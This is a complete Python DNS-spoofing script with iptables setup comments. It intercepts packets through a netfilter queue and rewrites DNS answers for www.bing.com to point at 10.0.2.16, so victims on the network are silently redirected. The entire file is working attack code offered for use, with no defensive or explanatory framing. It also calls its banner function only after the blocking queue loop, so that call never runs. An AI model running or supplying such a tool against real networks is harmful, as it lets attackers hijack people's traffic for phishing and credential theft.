#!/usr/bin/env python

# pip install netfilterqueue
# iptables -I FORWARD -j NFQUEUE --queue-num (any number you want to start with your queue) 
# iptables -I OUTPUT -j NFQUEUE --queue-num (any number you want to start with your queue) 
# iptables -I INPUT -j NFQUEUE --queue-num (any number you want to start with your queue) 

import scapy.all as scapy 
import netfilterqueue  # Use lowercase for the module name
import pyfiglet
import subprocess

def get_banner():
    banner = pyfiglet.figlet_format('Dns Spoofer', font='slant')
    subprocess.call(f"echo '{banner}' | lolcat", shell=True)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        if "www.bing.com" in qname :
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1


            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()  
queue.bind(0, process_packet)
queue.run()

get_banner()
